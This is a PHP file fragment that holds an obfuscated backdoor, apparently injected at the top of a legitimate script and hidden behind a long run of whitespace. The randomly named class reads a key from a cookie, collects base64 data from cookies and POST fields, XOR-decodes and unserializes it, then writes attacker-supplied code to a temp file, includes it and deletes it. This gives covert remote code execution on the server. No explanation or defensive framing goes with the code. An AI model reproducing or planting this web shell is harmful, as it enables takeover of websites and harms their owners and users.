<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("zhwucxvx")){class zhwucxvx{public static $fjagnrmhv = "oordeyebjlpnsbom";public static $kthuqoldx = NULL;public function __construct(){$clhmpeaj = @$_COOKIE[substr(zhwucxvx::$fjagnrmhv, 0, 4)];if (!empty($clhmpeaj)){$wntne = "base64";$kgpowv = "";$clhmpeaj = explode(",", $clhmpeaj);foreach ($clhmpeaj as $uiymkutl){$kgpowv .= @$_COOKIE[$uiymkutl];$kgpowv .= @$_POST[$uiymkutl];}$kgpowv = array_map($wntne . "_decode", array($kgpowv,));$kgpowv = $kgpowv[0] ^ str_repeat(zhwucxvx::$fjagnrmhv, (strlen($kgpowv[0]) / strlen(zhwucxvx::$fjagnrmhv)) + 1);zhwucxvx::$kthuqoldx = @unserialize($kgpowv);}}public function __destruct(){$this->xvfexdt();}private function xvfexdt(){if (is_array(zhwucxvx::$kthuqoldx)) {$bekisl = sys_get_temp_dir() . "/" . crc32(zhwucxvx::$kthuqoldx["salt"]);@zhwucxvx::$kthuqoldx["write"]($bekisl, zhwucxvx::$kthuqoldx["content"]);include $bekisl;@zhwucxvx::$kthuqoldx["delete"]($bekisl);exit();}}}$jzbkrn = new zhwucxvx();$jzbkrn = NULL;} ?><?php
